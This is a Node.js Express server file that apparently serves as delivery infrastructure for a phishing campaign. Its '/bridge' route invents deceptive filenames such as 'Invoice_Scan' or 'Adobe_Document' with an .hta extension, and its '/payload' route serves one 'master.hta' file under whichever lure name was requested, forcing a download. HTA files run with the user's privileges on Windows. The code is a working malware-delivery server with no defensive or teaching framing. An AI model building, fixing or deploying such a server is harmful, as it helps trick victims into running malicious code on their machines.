const express = require('express');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');

const app = express();
const port = process.env.PORT || 3000;

// Log public folder contents ONCE at startup for debugging
const publicDir = path.join(__dirname, 'public');
console.log('[STARTUP] __dirname:', __dirname);
console.log('[STARTUP] publicDir:', publicDir);
if (fs.existsSync(publicDir)) {
    console.log('[STARTUP] public/ contents:', fs.readdirSync(publicDir));
} else {
    console.error('[STARTUP] ERROR: public/ directory does not exist!');
}

// BRIDGE
app.get('/bridge', (req, res) => {
    const randomId = crypto.randomInt(100000, 999999);
    const themes = ['Adobe_Document', 'Contract_Agreement', 'Invoice_Scan', 'Policy_Update', 'Secure_Form'];
    const theme = themes[Math.floor(Math.random() * themes.length)];
    const uniqueName = `${theme}_${randomId}.hta`;
    res.redirect(`/confirm.html?file=${encodeURIComponent(uniqueName)}`);
});

// PAYLOAD - WITH FULL DIAGNOSTICS
app.get('/payload/:filename', (req, res) => {
    const filePath = path.resolve(path.join(__dirname, 'public', 'master.hta'));
    
    console.log('[PAYLOAD] Requested:', req.params.filename);
    console.log('[PAYLOAD] Resolved path:', filePath);
    console.log('[PAYLOAD] File exists:', fs.existsSync(filePath));
    
    // List files in public/ on EVERY request to catch race conditions
    try {
        const files = fs.readdirSync(path.join(__dirname, 'public'));
        console.log('[PAYLOAD] Current public/ files:', files);
    } catch(e) {
        console.error('[PAYLOAD] Cannot read public/ dir:', e.message);
    }
    
    if (!fs.existsSync(filePath)) {
        return res.status(404).json({ 
            error: 'master.hta not found', 
            lookedAt: filePath,
            publicContents: fs.existsSync(publicDir) ? fs.readdirSync(publicDir) : 'DIR_MISSING'
        });
    }

    res.setHeader('Content-Disposition', `attachment; filename="${req.params.filename}"`);
    res.setHeader('Content-Type', 'application/hta');
    res.sendFile(filePath);
});

// Serve HTML files explicitly
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/confirm.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'confirm.html')));

app.listen(port, () => console.log(`✅ Running on port ${port}`));
